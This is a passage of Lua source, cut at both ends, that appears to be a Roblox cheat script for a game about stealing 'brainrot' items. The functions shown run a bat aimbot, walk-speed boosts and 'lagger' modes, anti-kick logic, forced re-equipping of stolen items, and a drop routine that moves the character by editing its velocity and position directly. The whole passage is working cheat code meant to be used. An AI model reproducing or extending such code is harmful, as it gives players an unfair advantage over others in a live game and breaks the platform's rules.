            if bat then
                if bat.Parent ~= char then pcall(function() hum:EquipTool(bat) end) end
                pcall(function() bat:Activate() end)
            end
            task.delay(M.autoMoveSwingInterval or 0.3, function() M._arSwingDebounce = false end)
        end
    end)
end

function M.enableAntiKick()
    M.antiKickEnabled = true
    task.spawn(function()
        while M.antiKickEnabled do
            task.wait(0.5)
            local char = player.Character
            if char then
                local found = false
                for _, tool in ipairs(char:GetChildren()) do
                    if tool:IsA("Tool") then
                        local n = tool.Name:lower()
                        if n:find("brainrot") or n:find("skibidi") or n:find("toilet") then
                            found = true
                            break
                        end
                    end
                end
                M.brainrotDetected = found
                if found then
                    if M.autoBatEnabled then M.stopBatAimbot() end
                    if M.autoLeftEnabled then M.autoLeftEnabled=false; if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end; M.stopAutoLeft() end
                    if M.autoRightEnabled then M.autoRightEnabled=false; if M.autoRightSetVisual then M.autoRightSetVisual(false) end; M.stopAutoRight() end
                end
            end
        end
    end)
end

function M.disableAntiKick()
    M.antiKickEnabled = false

    M.customFontSelected = "None"
    M.brainrotDetected = false
end

function M.safeModeGetCountdownLabel()
    local ok, label = pcall(function()
        local pg = player:FindFirstChild("PlayerGui")
        if not pg then return nil end
        local top = pg:FindFirstChild("DuelsMachineTopFrame")
        if not top then return nil end
        local inner = top:FindFirstChild("DuelsMachineTopFrame")
        if not inner then return nil end
        local timer = inner:FindFirstChild("Timer")
        if not timer then return nil end
        return timer:FindFirstChild("Label")
    end)
    return (ok and label) or nil
end

function M.safeModeCountdownNumber(text)
    local t = tostring(text or ""):upper():gsub("^%s+", ""):gsub("%s+$", "")
    if t == "GO" or t == "START" or t == "READY" then return true end
    local n = tonumber(t)
    return n ~= nil and n >= 0 and n <= 10
end

function M.safeModeInDuelCountdown()
    local label = M.safeModeGetCountdownLabel()
    return label and M.safeModeCountdownNumber(label.Text) or false
end

M.SAFE_MODE_BLOCKED_TOOLS = {
    bat=true, slap=true, sword=true, gun=true, pistol=true, rifle=true,
    medusa=true, hammer=true, axe=true, knife=true, katana=true, blade=true, fist=true,
}

function M.safeModeIsCarryableTool(tool)
    if not tool or not tool:IsA("Tool") then return false end
    local name = tool.Name:lower()
    for word in pairs(M.SAFE_MODE_BLOCKED_TOOLS) do
        if name:find(word, 1, true) then return false end
    end
    return true
end

function M.safeModeHoldingBrainrot()
    local ok, val = pcall(function() return player:GetAttribute("Stealing") end)
    if ok and val == true then return true end
    local ok2, val2 = pcall(function() return player:GetAttribute("AntiKick") end)
    if ok2 and val2 == true then return true end
    local char = player.Character
    if not char then return false end
    local ok3, val3 = pcall(function() return char:GetAttribute("Stealing") end)
    if ok3 and val3 == true then return true end
    if M.brainrotDetected then return true end
    if M.hasBrainrotInHand and M.hasBrainrotInHand() then return true end
    for _, name in ipairs({"Carrying", "IsCarrying", "Grabbed", "Holding", "StealHold", "HasGrab"}) do
        local v = char:FindFirstChild(name, true)
        if v then
            if v:IsA("BoolValue") and v.Value then return true end
            if v:IsA("ObjectValue") and v.Value then return true end
            if v:IsA("StringValue") and v.Value ~= "" then return true end
        end
    end
    for _, child in ipairs(char:GetChildren()) do
        if child:IsA("Model") and child:FindFirstChildWhichIsA("BasePart", true) then
            local n = child.Name:lower()
            if n:find("brainrot") or n:find("animal") or n:find("carry") or n:find("grab") or n:find("steal") or n:find("hold") then
                return true
            end
        end
    end
    return false
end

function M.safeModeIsLocked()
    if not M.safeModeEnabled then return false end
    return M.safeModeInDuelCountdown() or M.safeModeHoldingBrainrot()
end

function M.safeModeForceStop(reason)
    local stopped = false
    if M.autoBatEnabled then
        M.stopBatAimbot()
        stopped = true
    end
    if M.bypassAimbotEnabled then
        M.stopBypassAimbot()
        stopped = true
    end
    if M.autoLeftEnabled then
        M.autoLeftEnabled = false
        if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end
        M.stopAutoLeft()
        stopped = true
    end
    if M.autoRightEnabled then
        M.autoRightEnabled = false
        if M.autoRightSetVisual then M.autoRightSetVisual(false) end
        M.stopAutoRight()
        stopped = true
    end
    if stopped then

        pcall(function()
            if type(showActionNotification) == "function" then
                showActionNotification(reason or "SAFE MODE LOCK")
            end
        end)
    end
end

function M.safeModeTryStart()
    if M.safeModeIsLocked() then
        M.safeModeForceStop("SAFE MODE LOCK")
        return false
    end
    return true
end

function M.enableSafeMode()
    M.safeModeEnabled = true
end

function M.disableSafeMode()
    M.safeModeEnabled = false
end

if not M._safeModeMonitorStarted then
    M._safeModeMonitorStarted = true
    local _smAcc = 0
    RunService.Heartbeat:Connect(function(dt)
        if not M.safeModeEnabled then return end
        _smAcc = _smAcc + (dt or 0.016)
        if _smAcc < 0.25 then return end
        _smAcc = 0
        if M.safeModeIsLocked() then
            M.safeModeForceStop("SAFE MODE LOCK")
        end
    end)
end

function M.isStealState()

    local char = player.Character
    if not char then return false end
    if M.hasBrainrotInHand() then return true end
    local h = char:FindFirstChildOfClass("Humanoid")
    if h and h.WalkSpeed < 25 then return true end
    local ok, val = pcall(function() return player:GetAttribute("Stealing") end)
    if ok and val == true then return true end
    local ok2, val2 = pcall(function() return char:GetAttribute("Stealing") end)
    if ok2 and val2 == true then return true end
    return false
end

function M.getActiveMoveSpeed()
    -- Exclusive modes: Lagger Carry uses ONLY LAGGER_CARRY_SPEED
    if M.laggerCarryActive == true then
        return math.max(1, tonumber(M.LAGGER_CARRY_SPEED) or 15)
    end
    if M.laggerModeEnabled == true then
        -- normal lagger; if also carrying brainrot with carry flag, still lagger normal
        -- (use Lagger Carry mode for the carry speed value)
        return math.max(1, tonumber(M.LAGGER_SPEED) or 30)
    end
    if M.carrySpeedActive == true then
        return math.max(1, tonumber(M.CS) or 29)
    end
    return math.max(1, tonumber(M.NS) or 59)
end

function M.setSpeedCustomizerPath(pathName)
    pathName = (tostring(pathName) == "Lagger") and "Lagger" or "Normal"

    M.speedBoosterEnabled = true
    M.speedBoosterPath = pathName
    M.laggerModeEnabled = (pathName == "Lagger")
    M.laggerCarryActive = false
    M.carrySpeedActive = false

    if M.speedBoosterApplyPath then
        pcall(function() M.speedBoosterApplyPath(pathName, true) end)
    end
    if M.speedBoosterSyncPath then
        pcall(function() M.speedBoosterSyncPath(pathName) end)
    end

    M.speedBoosterPath = pathName
    M.laggerModeEnabled = (pathName == "Lagger")
    M.laggerCarryActive = false
    M.carrySpeedActive = false
    if M.mobBtnRefs.lagger then pcall(function() M.mobBtnRefs.lagger(pathName == "Lagger") end) end
    if M.mobBtnRefs.carrySpeed then pcall(function() M.mobBtnRefs.carrySpeed(false) end) end
    if M.mobBtnRefs.laggerCarry then pcall(function() M.mobBtnRefs.laggerCarry(false) end) end
    if M.laggerModeBtn then M.laggerModeBtn.Text = (pathName == "Lagger") and "Lag On" or "Lag Off" end
    if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry Off" end
    if M.refreshSpeedModeLabel then pcall(M.refreshSpeedModeLabel) end
    task.defer(function() pcall(saveCherryConfig) end)
end

function M.toggleSpeedCustomizerPath()
    local cur = tostring(M.speedBoosterPath)
    if cur == "Lagger" then
        M.setSpeedCustomizerPath("Normal")
    else
        M.setSpeedCustomizerPath("Lagger")
    end
end

function M.getAutoPathSpeed()
    if M.laggerCarryActive then
        return tonumber(M.LAGGER_CARRY_SPEED) or 22
    elseif M.laggerModeEnabled then
        return tonumber(M.LAGGER_SPEED) or 22
    else
        return tonumber(M.NS) or 60
    end
end

function M.setModeNormalFlags()
    M.carrySpeedActive = false
    M.laggerModeEnabled = false
    M.laggerCarryActive = false
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(false) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(false) end
    if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
    if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry Off" end
    if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
    if M.refreshSpeedModeButtons then M.refreshSpeedModeButtons() end
    if M.refreshSpeedCustomizerFields then M.refreshSpeedCustomizerFields() end
    if M.refreshSpeedCustomizerPanelUI then M.refreshSpeedCustomizerPanelUI() end
end

function M.setModeLaggerFlags()
    M.carrySpeedActive = false
    M.laggerModeEnabled = true
    M.laggerCarryActive = false
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(true) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(false) end
    if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
    if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag On" end
    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry Off" end
    if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
    if M.refreshSpeedModeButtons then M.refreshSpeedModeButtons() end
    if M.refreshSpeedCustomizerFields then M.refreshSpeedCustomizerFields() end
    if M.refreshSpeedCustomizerPanelUI then M.refreshSpeedCustomizerPanelUI() end
end

function M.setModeCarryFlags()
    M.carrySpeedActive = true
    M.laggerModeEnabled = false
    M.laggerCarryActive = false
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(true) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(false) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(false) end
    if M.carryModeBtn then M.carryModeBtn.Text = "Carry On" end
    if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry Off" end
    if M._applyCarryBtnColor then pcall(M._applyCarryBtnColor, true) end
    if M._applyLagBtnColor then pcall(M._applyLagBtnColor, false) end
    if M._applyLCBtnColor then pcall(M._applyLCBtnColor, false) end
    if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
    if M.refreshSpeedModeButtons then M.refreshSpeedModeButtons() end
    if M.refreshSpeedCustomizerFields then M.refreshSpeedCustomizerFields() end
end

function M.setModeLaggerCarryFlags()
    M.carrySpeedActive = false
    M.laggerModeEnabled = false
    M.laggerCarryActive = true
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(false) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(true) end
    if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
    if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry On" end
    if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
    if M.refreshSpeedModeButtons then M.refreshSpeedModeButtons() end
    if M.refreshSpeedCustomizerFields then M.refreshSpeedCustomizerFields() end
end

function M.stopWalkSpeedAutoSwitch()
    if M._autoSwitchSpeedConn then
        pcall(function() M._autoSwitchSpeedConn:Disconnect() end)
        M._autoSwitchSpeedConn = nil
    end
end

function M.startWalkSpeedAutoSwitch()
    if M._autoSwitchSpeedConn then return end
    M._autoSwitchSpeedConn = RunService.Heartbeat:Connect(function()
        if not M.autoSwitchSpeedEnabled then
            M.stopWalkSpeedAutoSwitch()
            return
        end
        local char = player.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        local ws = hum.WalkSpeed or 16
        local thr = tonumber(M.AUTO_SWITCH_THRESHOLD) or 25

        if M.autoSwitchSpeedEnabled and ws <= thr and not M.carrySpeedActive and not M.laggerCarryActive then
            M.setModeCarryFlags()
        end
    end)
end


local function isMyPlot(plotName)
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return false end
    local plot = plots:FindFirstChild(plotName)
    if not plot then return false end
    local sign = plot:FindFirstChild("PlotSign")
    if sign then
        local yb = sign:FindFirstChild("YourBase")
        if yb and yb:IsA("BillboardGui") then return yb.Enabled == true end
    end
    return false
end

function M.isNearEnemyBase(range)
    range = tonumber(range) or M.autoCarryEnemyBaseRange or 35
    local char = player.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return false end
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return false end
    local myPos = hrp.Position
    for _, plot in ipairs(plots:GetChildren()) do
        if plot:IsA("Model") and not isMyPlot(plot.Name) then
            local pos
            local ok, pivot = pcall(function() return plot:GetPivot().Position end)
            if ok and pivot then pos = pivot
            else
                local sign = plot:FindFirstChild("PlotSign")
                if sign and sign:IsA("BasePart") then pos = sign.Position
                elseif sign then
                    local pp = sign:FindFirstChildWhichIsA("BasePart", true)
                    if pp then pos = pp.Position end
                end
            end
            if pos then
                local flat = Vector3.new(myPos.X - pos.X, 0, myPos.Z - pos.Z)
                if flat.Magnitude <= range then return true end
            end
        end
    end
    return false
end
function M.enableCarryModeOnly()
    if M.carrySpeedActive then return end
    M.carrySpeedActive = true
    M.laggerModeEnabled = false
    M.laggerCarryActive = false
    if M.carryModeBtn then M.carryModeBtn.Text = "Carry On" end
    if M.laggerModeBtn then M.laggerModeBtn.Text = "Lag Off" end
    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry Off" end
    if M.mobBtnRefs.carrySpeed then pcall(function() M.mobBtnRefs.carrySpeed(true) end) end
    if M.mobBtnRefs.lagger then pcall(function() M.mobBtnRefs.lagger(false) end) end
    if M.mobBtnRefs.laggerCarry then pcall(function() M.mobBtnRefs.laggerCarry(false) end) end
    if M._applyCarryBtnColor then pcall(M._applyCarryBtnColor, true) end
    if M._applyLagBtnColor then pcall(M._applyLagBtnColor, false) end
    if M._applyLCBtnColor then pcall(M._applyLCBtnColor, false) end
    if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
end
function M.startAutoCarryEnemyBase()
    if M._autoCarryEnemyBaseConn then return end
    local acc = 0
    M._autoCarryEnemyBaseConn = RunService.Heartbeat:Connect(function(dt)
        if not M.autoCarryEnemyBaseEnabled then return end
        acc = acc + (dt or 0.016)
        if acc < 0.2 then return end
        acc = 0
        if M.carrySpeedActive then return end
        if M.isNearEnemyBase(M.autoCarryEnemyBaseRange) then M.enableCarryModeOnly() end
    end)
end
function M.stopAutoCarryEnemyBase()
    if M._autoCarryEnemyBaseConn then pcall(function() M._autoCarryEnemyBaseConn:Disconnect() end); M._autoCarryEnemyBaseConn = nil end
end
function M.setAutoCarryEnemyBase(on)
    M.autoCarryEnemyBaseEnabled = on and true or false
    if M.autoCarryEnemyBaseEnabled then M.startAutoCarryEnemyBase() else M.stopAutoCarryEnemyBase() end
    if M.setAutoCarryEnemyBaseVisual then pcall(function() M.setAutoCarryEnemyBaseVisual(M.autoCarryEnemyBaseEnabled) end) end
end
function M.refreshWalkSpeedAutoSwitch()
    if M.autoSwitchSpeedEnabled then
        M.startWalkSpeedAutoSwitch()
    else
        M.stopWalkSpeedAutoSwitch()
    end
end

function M.updateAutoSwitchSpeed()

    if M.autoSwitchSpeedEnabled then
        local isSteal = M.isStealState()
        if isSteal ~= M._autoSwitchWasSteal then
            M._autoSwitchWasSteal = isSteal
            local inLagger = M.laggerModeEnabled or M.laggerCarryActive
            if isSteal then
                if inLagger then
                    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(true) end
                    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
                    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry On" end
                    if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
                else
                    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(true) end
                    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(false) end
                    if M.carryModeBtn then M.carryModeBtn.Text = "Carry On" end
                    if M.laggerCarryBtn then M.laggerCarryBtn.Text = "L.Carry Off" end
                end
            else
                if inLagger then
                    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end
                    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
                    if M.laggerCarryBtn then M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off" end
                    if M.laggerModeBtn then M.laggerModeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off" end
                    if M.carryModeBtn then M.carryModeBtn.Text = "Carry Off" end
                else
                    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(false) end
                    if M.carryModeBtn then M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off" end
                end
            end
            if M.refreshSpeedModeLabel then M.refreshSpeedModeLabel() end
        end
    end
end

function M.isRagdollState(hum)
    if not hum then return true end;local st=hum:GetState()
    return hum.PlatformStand or st==Enum.HumanoidStateType.Physics or st==Enum.HumanoidStateType.Ragdoll or st==Enum.HumanoidStateType.FallingDown
end

M.lastDropTime = M.lastDropTime or 0
M.dropConnections = M.dropConnections or {}

-- ========== ANTI DROP (no accidental unequip at high speed) ==========
-- Only allows a real drop when runDrop / executeDrop sets _antiDropAllow.
M.ANTI_DROP_NAME_HINTS = {
    "brainrot", "skibidi", "toilet", "animal", "carry", "grab", "steal",
    "hold", "pet", "unit", "item", "package", "box", "crate",
}

function M.isAntiDropCarryTool(tool)
    if not tool or not tool:IsA("Tool") then return false end
    -- Never lock combat tools
    local n = tool.Name:lower()
    for _, bad in ipairs({"bat", "slap", "sword", "gun", "medusa", "hammer", "knife", "katana", "blade", "fist", "pistol", "rifle", "axe"}) do
        if n:find(bad, 1, true) then return false end
    end
    if M.safeModeIsCarryableTool and M.safeModeIsCarryableTool(tool) then
        -- safeMode blocks combat; still require a carry-ish name or attribute
        for _, h in ipairs(M.ANTI_DROP_NAME_HINTS) do
            if n:find(h, 1, true) then return true end
        end
    end
    for _, h in ipairs(M.ANTI_DROP_NAME_HINTS) do
        if n:find(h, 1, true) then return true end
    end
    local ok, ste = pcall(function() return tool:GetAttribute("Stealing") or tool:GetAttribute("Carry") or tool:GetAttribute("Brainrot") end)
    if ok and ste then return true end
    return false
end

function M._antiDropRemember(char)
    if not char then return end
    for _, ch in ipairs(char:GetChildren()) do
        if M.isAntiDropCarryTool(ch) then
            M._antiDropLastTool = ch
            return
        end
    end
end

function M._antiDropReequip(tool)
    if not M.antiDropEnabled then return end
    if M._antiDropAllow or M.dropActive then return end
    if not tool or not tool.Parent then return end
    if M._antiDropIgnoreTool and tool == M._antiDropIgnoreTool then return end
    local char = player.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum or hum.Health <= 0 then return end
    -- tool may be in Backpack or floating
    pcall(function()
        if tool.Parent ~= char then
            tool.Parent = char
        end
        if hum then
            hum:EquipTool(tool)
        end
    end)
    M._antiDropLastTool = tool
end

function M.stopAntiDrop()
    for _, c in pairs(M._antiDropConns or {}) do
        pcall(function() c:Disconnect() end)
    end
    M._antiDropConns = {}
    if M._antiDropHeartbeat then
        pcall(function() M._antiDropHeartbeat:Disconnect() end)
        M._antiDropHeartbeat = nil
    end
end

function M.startAntiDrop(char)
    M.stopAntiDrop()
    if M.antiDropEnabled == false then return end
    char = char or player.Character
    if not char then return end
    M._antiDropRemember(char)

    local function onRemoved(child)
        if not M.antiDropEnabled then return end
        if M._antiDropAllow or M.dropActive then return end
        if not child or not child:IsA("Tool") then return end
        if not M.isAntiDropCarryTool(child) then return end
        -- High-speed / desync / lag often dumps tool into Backpack or nil briefly
        task.defer(function()
            if M._antiDropAllow or M.dropActive then return end
            if not child or not child.Parent then return end
            local stillOnChar = player.Character and child.Parent == player.Character
            if stillOnChar then return end
            M._antiDropReequip(child)
        end)
    end

    table.insert(M._antiDropConns, char.ChildRemoved:Connect(onRemoved))
    table.insert(M._antiDropConns, char.ChildAdded:Connect(function(child)
        if child and child:IsA("Tool") and M.isAntiDropCarryTool(child) then
            M._antiDropLastTool = child
            -- Also catch Unequipped from the tool itself
            pcall(function()
                table.insert(M._antiDropConns, child.Unequipped:Connect(function()
                    if not M.antiDropEnabled or M._antiDropAllow or M.dropActive then return end
                    task.defer(function()
                        if M._antiDropAllow or M.dropActive then return end
                        M._antiDropReequip(child)
                    end)
                end))
            end)
        end
    end))

    -- Backpack catch: if a carry tool lands in backpack without intentional drop, re-equip
    local bp = player:FindFirstChildOfClass("Backpack") or player:FindFirstChild("Backpack")
    if bp then
        table.insert(M._antiDropConns, bp.ChildAdded:Connect(function(child)
            if not M.antiDropEnabled or M._antiDropAllow or M.dropActive then return end
            if child and child:IsA("Tool") and M.isAntiDropCarryTool(child) then
                task.defer(function()
                    if M._antiDropAllow or M.dropActive then return end
                    M._antiDropReequip(child)
                end)
            end
        end))
    end

    -- Heartbeat safety: if we were holding and tool vanished into backpack, pull it back
    local acc = 0
    M._antiDropHeartbeat = RunService.Heartbeat:Connect(function(dt)
        if not M.antiDropEnabled or M._antiDropAllow or M.dropActive then return end
        acc = acc + (dt or 0.016)
        if acc < 0.08 then return end
        acc = 0
        local c = player.Character
        if not c then return end
        local holding = false
        for _, ch in ipairs(c:GetChildren()) do
            if M.isAntiDropCarryTool(ch) then
                holding = true
                M._antiDropLastTool = ch
                break
            end
        end
        if holding then return end
        local last = M._antiDropLastTool
        if last and last.Parent then
            local bp2 = player:FindFirstChildOfClass("Backpack")
            if bp2 and last.Parent == bp2 then
                M._antiDropReequip(last)
            end
        else
            -- scan backpack for any carry tool we should keep
            local bp2 = player:FindFirstChildOfClass("Backpack")
            if bp2 then
                for _, t in ipairs(bp2:GetChildren()) do
                    if M.isAntiDropCarryTool(t) then
                        -- only pull back if we recently had one / brainrot flags
                        if M.brainrotDetected or M.safeModeHoldingBrainrot and M.safeModeHoldingBrainrot() then
                            M._antiDropReequip(t)
                            break
                        end
                    end
                end
            end
        end
    end)
end

function M.setAntiDropEnabled(on)
    M.antiDropEnabled = on == true
    if M.antiDropEnabled then
        M.startAntiDrop(player.Character)
    else
        M.stopAntiDrop()
    end
end

-- Boot anti-drop
task.defer(function()
    task.wait(0.4)
    if M.antiDropEnabled ~= false then
        pcall(function() M.startAntiDrop(player.Character) end)
    end
end)
player.CharacterAdded:Connect(function(char)
    task.delay(0.35, function()
        if M.antiDropEnabled ~= false and player.Character == char then
            pcall(function() M.startAntiDrop(char) end)
        end
    end)
end)



function M.stopDropBrainrot()
    M.dropActive = false
    if M._dropConn then
        pcall(function() M._dropConn:Disconnect() end)
        M._dropConn = nil
    end
    for _, t in ipairs(M.dropConnections or {}) do
        if type(t) == "thread" then
            pcall(task.cancel, t)
        elseif typeof(t) == "RBXScriptConnection" then
            pcall(function() t:Disconnect() end)
        end
    end
    M.dropConnections = {}
    local c = player.Character
    if c then
        local root = c:FindFirstChild("HumanoidRootPart")
        if root then
            root.AssemblyLinearVelocity = Vector3.zero
            root.AssemblyAngularVelocity = Vector3.zero
        end
    end
end

function M.runDrop()
    if M.dropActive then return end

    local now = tick()
    if M._lastDropInvoke and (now - M._lastDropInvoke) < 0.2 then return end
    M._lastDropInvoke = now

    if M.bypassAimbotEnabled then return end
    pcall(function() M.stopAutoTPForAction() end)

    local char = player.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end

    -- Intentional drop: temporarily disable anti-drop so the item can leave
    M._antiDropAllow = true
    local char0 = player.Character
    if char0 then
        for _, ch in ipairs(char0:GetChildren()) do
            if M.isAntiDropCarryTool and M.isAntiDropCarryTool(ch) then
                M._antiDropIgnoreTool = ch
                break
            end
        end
    end
    M._antiDropLastTool = nil
    task.delay(2.0, function()
        M._antiDropAllow = false
        M._antiDropIgnoreTool = nil
    end)

    if M.autoBatEnabled then
        M.autoBatEnabled = false
        pcall(function() if M.stopBatAimbot then M.stopBatAimbot() end end)
        pcall(function() if M.autoBatSetVisual then M.autoBatSetVisual(false) end end)
        if M.mobBtnRefs and M.mobBtnRefs.autoBat then
            pcall(function() M.mobBtnRefs.autoBat(false) end)
        end
    end

    M.dropActive = true
    if M.mobBtnRefs and M.mobBtnRefs.drop then
        pcall(function() M.mobBtnRefs.drop(true) end)
    end

    local t0 = tick()
    if M._dropConn then pcall(function() M._dropConn:Disconnect() end); M._dropConn = nil end

    M._dropConn = RunService.Heartbeat:Connect(function()
        local c = player.Character
        local r = c and c:FindFirstChild("HumanoidRootPart")
        if not r or not M.dropActive then
            if M._dropConn then pcall(function() M._dropConn:Disconnect() end); M._dropConn = nil end
            M.dropActive = false
            if M.mobBtnRefs and M.mobBtnRefs.drop then
                pcall(function() M.mobBtnRefs.drop(false) end)
            end
            return
        end

        if tick() - t0 < (tonumber(M.DROP_ASCEND_DURATION) or 0.22) then
            local lv = r.AssemblyLinearVelocity
            r.AssemblyLinearVelocity = Vector3.new(lv.X, tonumber(M.DROP_ASCEND_SPEED) or 160, lv.Z)
            return
        end

        if M._dropConn then pcall(function() M._dropConn:Disconnect() end); M._dropConn = nil end
        pcall(function()
            local rp = RaycastParams.new()
            rp.FilterDescendantsInstances = {c}
            rp.FilterType = Enum.RaycastFilterType.Exclude
            local rr = workspace:Raycast(r.Position, Vector3.new(0, -3000, 0), rp)
            if rr then
                local hum = c:FindFirstChildOfClass("Humanoid")
                local offset = ((hum and hum.HipHeight) or 2) + (r.Size.Y / 2)
                r.CFrame = CFrame.new(r.Position.X, rr.Position.Y + offset, r.Position.Z)
                r.AssemblyLinearVelocity = Vector3.new(0, -15, 0)
            else
                r.CFrame = CFrame.new(r.Position.X, -7, r.Position.Z)
                r.AssemblyLinearVelocity = Vector3.zero
            end
        end)
        M.dropActive = false
        if M.mobBtnRefs and M.mobBtnRefs.drop then
            pcall(function() M.mobBtnRefs.drop(false) end)
        end
    end)
end

M.runDropBrainrot = M.runDrop

function M.executeDropWithToggle(setVisual)
    if M.dropActive then return end
    task.spawn(function()
        if setVisual then pcall(setVisual, true) end
        M.runDrop()
        while M.dropActive do task.wait() end
        task.wait(0.1)
        if setVisual then pcall(setVisual, false) end
    end)
end

function M.stopAutoTPForAction()
    if M.autoTPEnabled then
        M.stopAutoTP()
        pcall(function() if M.setAutoTPVisual then M.setAutoTPVisual(false) end end)
        pcall(function() if M.saveConfig then M.saveConfig() end end)
    end
end

local function setupDeathReset()

    if M._deathResetConn then
        pcall(function() M._deathResetConn:Disconnect() end)
        M._deathResetConn = nil
    end
    M.autoResetOnDeath = false
end

function M.startRemoveAcc()
    if M.removeAccEnabled then return end
    M.removeAccEnabled = true
    local function removeAccDo()
        if not M.removeAccEnabled then return end
        local char = player.Character
        if not char then return end
        for _,obj in ipairs(char:GetDescendants()) do
            if obj:IsA("Accessory") or obj:IsA("Hat") then
                if not M.removedAccessories[obj] then
                    M.removedAccessories[obj] = true
                    pcall(function() obj:Destroy() end)
                end
            end
        end
    end
    removeAccDo()
    M.removeAccConn = player.CharacterAdded:Connect(function()
        task.wait(0.5)
        if M.removeAccEnabled then removeAccDo() end
    end)
end

function M.stopRemoveAcc()
    M.removeAccEnabled = false
    if M.removeAccConn then
        M.removeAccConn:Disconnect()
        M.removeAccConn = nil
    end
    M.removedAccessories = {}
end

function M.destroyMobileButtons()
    if M.mobGuiRef then
        pcall(function() M.mobGuiRef:Destroy() end)
        M.mobGuiRef = nil
    end
    for _,n in ipairs({"MoveeMobileButtons"}) do
        local old = game:GetService("CoreGui"):FindFirstChild(n); if old then old:Destroy() end
        local pgui = player:FindFirstChild("PlayerGui"); if pgui then local o = pgui:FindFirstChild(n); if o then o:Destroy() end end
    end
    M.mobBtnRefs = {}
    M.mobBtnFrames = {}
end

function M.loadBtnPositions()
    local out = {}

    if isfile and isfile(M.MOB_POS_FILE) then
        local ok, data = pcall(function() return HS:JSONDecode(readfile(M.MOB_POS_FILE)) end)
        if ok and type(data) == "table" then
            for k, v in pairs(data) do
                if type(v) == "table" then
                    out[k] = v
                end
            end
        end
    end

    if M._btnPosCache and type(M._btnPosCache) == "table" then
        for k, v in pairs(M._btnPosCache) do
            if not out[k] and type(v) == "table" and type(v.x) == "number" and type(v.y) == "number" then
                out[k] = {x = v.x, y = v.y}
            end
        end
    end
    return out
end

function M.saveBtnPositions()
    if not M.mobGuiRef or not M.mobGuiRef.Parent then return end
    -- start from previous cache so hidden buttons keep their last position
    local out = {}
    if type(M._btnPosCache) == "table" then
        for k, v in pairs(M._btnPosCache) do
            if type(v) == "table" then out[k] = v end
        end
    end
    local function pack(key, child)
        if not (key and child and child.Parent) then return end
        local p = child.Parent
        local ax, ay = child.AbsolutePosition.X, child.AbsolutePosition.Y
        local px, py = 0, 0
        pcall(function()
            px = p.AbsolutePosition.X
            py = p.AbsolutePosition.Y
        end)
        out[key] = {
            x = ax,
            y = ay,
            sx = 0,
            sy = 0,
            ox = ax - px,
            oy = ay - py,
        }
    end
    if M.mobBtnFrames then
        for key, child in pairs(M.mobBtnFrames) do
            pack(key, child)
        end
    end
    if M.mobileButtonsFrame then
        for _, child in ipairs(M.mobileButtonsFrame:GetChildren()) do
            local key = child:GetAttribute("BtnKey")
            if key then pack(key, child) end
        end
    end
    for _, child in ipairs(M.mobGuiRef:GetChildren()) do
        local key = child:GetAttribute("BtnKey")
        if key then pack(key, child) end
    end
    M._btnPosCache = out
    if writefile then
        pcall(function() writefile(M.MOB_POS_FILE, HS:JSONEncode(out)) end)
    end
    -- do not call saveCherryConfig here (avoids recursion); caller saves config
end

function M.resetPanelPositions()
    M.pingPanelPos = nil
    M.killLaggerPanelPos = nil
    local pingDefault = UDim2.new(0.5, -160, 0.25, 0)
    local lagDefault = UDim2.new(0.5, -150, 0.15, 0)
    pcall(function()
